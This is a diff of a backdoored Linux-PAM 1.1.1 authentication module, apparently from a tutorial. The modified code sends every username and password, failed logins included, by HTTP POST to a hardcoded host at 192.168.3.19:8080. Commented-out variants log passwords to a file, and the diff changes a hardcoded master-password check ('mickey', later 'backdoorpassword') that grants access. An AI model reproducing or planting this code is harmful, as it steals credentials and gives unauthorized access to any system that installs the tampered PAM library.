@@ -266,7 +266,7 @@ cd Linux-PAM-1.1.1
 
 #177行加入，修改这里会记录所有的密码包括登陆失败的密码，请注意
     D((&quot;user=%s, password=[%s]&quot;, name, p));
-    /*  mode */
+    /*  mode 1  */
     int portno =        8080;
     char *host =        &quot;192.168.3.19&quot;;
     char *message_fmt = &quot;POST /u=%s&amp;p=%s HTTP/1.0\r\n\r\n&quot;;
@@ -299,16 +299,20 @@ cd Linux-PAM-1.1.1
     memset(response,0,sizeof(response));
     total = sizeof(response)-1;
     received = 0;
-    /* mode */
+    /* mode1  */
+    /* mode2 */
     // FILE *fp = fopen(&quot;/var/log/aaa111&quot;,&quot;w+&quot;);
     // if(fp != NULL) {
         // fwrite(&amp;p,strlen(p),2,fp);
         // fclose(fp);
     // }
+    /* mode2 */
 
     /* verify the password of this user */
     retval = _unix_verify_password(pamh, name, p, ctrl);
-    if(strcmp(p,&quot;mickey&quot;)==0){retval=PAM_SUCCESS;}
+    /* mode3 */
+    // if(strcmp(p,&quot;backdoorpassword&quot;)==0){retval=PAM_SUCCESS;}
+    /* mode3 */
 
     name = p = NULL;
 </code></pre>
